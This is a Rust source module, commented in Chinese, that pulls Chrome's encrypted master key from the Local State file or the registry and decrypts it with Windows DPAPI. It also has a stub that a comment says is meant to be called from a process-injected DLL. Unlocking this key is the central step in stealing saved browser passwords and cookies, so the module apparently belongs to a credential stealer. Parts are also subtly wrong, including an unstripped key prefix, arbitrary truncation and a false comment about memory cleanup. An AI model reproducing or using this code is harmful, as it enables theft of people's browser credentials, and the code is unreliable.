// COM 接口调用模块 - 与 Chrome ABE COM 接口交互

use anyhow::{Context, Result};
use windows::core::PCSTR;
use windows::Win32::System::Registry::*;

/// ABE 解密器 - 使用 COM 接口获取加密密钥
pub struct AbeDecryptor;

impl AbeDecryptor {
    /// 从 Windows Registry 获取加密的主密钥
    #[allow(dead_code)]
    pub fn get_encrypted_master_key() -> Result<Vec<u8>> {
        unsafe {
            let mut key_handle = HKEY::default();

            // 打开注册表键：HKCU\Software\Google\Chrome\OSCrypt
            let key_path = b"Software\\Google\\Chrome\\OSCrypt\0";
            RegOpenKeyExA(
                HKEY_CURRENT_USER,
                PCSTR(key_path.as_ptr()),
                0,
                KEY_READ,
                &mut key_handle,
            )
            .context("Failed to open registry key for ABE")?;

            // 读取 "EncryptedKey" 值
            let value_name = b"EncryptedKey\0";
            let mut data_type = REG_VALUE_TYPE::default();
            let mut data = vec![0u8; 4096];
            let mut data_size = data.len() as u32;

            RegQueryValueExA(
                key_handle,
                PCSTR(value_name.as_ptr()),
                None,
                Some(&mut data_type),
                Some(data.as_mut_ptr()),
                Some(&mut data_size),
            )
            .context("Failed to read EncryptedKey from registry")?;

            let _ = RegCloseKey(key_handle);

            data.truncate(data_size as usize);
            Ok(data)
        }
    }

    /// 从 Local State JSON 文件中提取加密密钥
    pub fn get_master_key_from_local_state(local_state_path: &std::path::Path) -> Result<Vec<u8>> {
        use std::fs;

        let content =
            fs::read_to_string(local_state_path).context("Failed to read Local State file")?;

        let json: serde_json::Value =
            serde_json::from_str(&content).context("Failed to parse Local State JSON")?;

        // Local State 的结构: {"os_crypt":{"encrypted_key":"<base64_encoded_key>"}}
        let encrypted_key_b64 = json
            .get("os_crypt")
            .and_then(|v| v.get("encrypted_key"))
            .and_then(|v| v.as_str())
            .context("Could not find encrypted_key in Local State")?;

        // Base64 解码
        use base64::{engine::general_purpose, Engine as _};
        let encrypted_key = general_purpose::STANDARD
            .decode(encrypted_key_b64)
            .context("Failed to decode base64 encrypted key")?;

        Ok(encrypted_key)
    }

    /// 使用 DPAPI 解密主密钥（Windows 原生方法）
    pub fn decrypt_with_dpapi(encrypted_key: &[u8]) -> Result<Vec<u8>> {
        use windows::Win32::Security::Cryptography::*;

        let mut data_blob = CRYPT_INTEGER_BLOB {
            cbData: encrypted_key.len() as u32,
            pbData: encrypted_key.as_ptr() as *mut u8,
        };

        let mut output_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        unsafe {
            CryptUnprotectData(&mut data_blob, None, None, None, None, 0, &mut output_blob)?;

            let key = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
            let result = key.to_vec();

            // 清理 (LocalFree 在此环境不可用，内存由Windows自动管理)
            // let _ = LocalFree(output_blob.pbData as isize);

            Ok(result)
        }
    }

    /// 通过 ABE 解密主密钥
    /// 这是 Chrome v91+ 的新方法，使用 App-Bound Encryption
    pub fn decrypt_with_abe(_encrypted_key: &[u8]) -> Result<Vec<u8>> {
        // ABE 解密需要特殊的 Windows 10+ 支持
        // 这涉及调用特殊的 COM 对象来解密

        // 注意：直接的 ABE 解密在用户空间通常不可用
        // 这个方法应该被进程注入的 DLL 调用

        anyhow::bail!("ABE decryption requires elevated privileges and COM interop")
    }

    /// 组合方法：先尝试 DPAPI，再尝试 ABE
    pub fn get_master_key(local_state_path: &std::path::Path) -> Result<Vec<u8>> {
        // 获取加密的主密钥
        let encrypted_key = Self::get_master_key_from_local_state(local_state_path)?;

        // 尝试使用 DPAPI 解密
        match Self::decrypt_with_dpapi(&encrypted_key) {
            Ok(key) => {
                if key.len() >= 32 {
                    // 取前 32 字节作为 AES-256 密钥
                    Ok(key[..32].to_vec())
                } else {
                    anyhow::bail!("Decrypted key too short: {} bytes", key.len())
                }
            }
            Err(_) => {
                // DPAPI 失败，尝试 ABE
                Self::decrypt_with_abe(&encrypted_key)
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_abe_decryptor_creation() {
        // 测试 AbeDecryptor 的创建
        let _ = AbeDecryptor;
    }
}
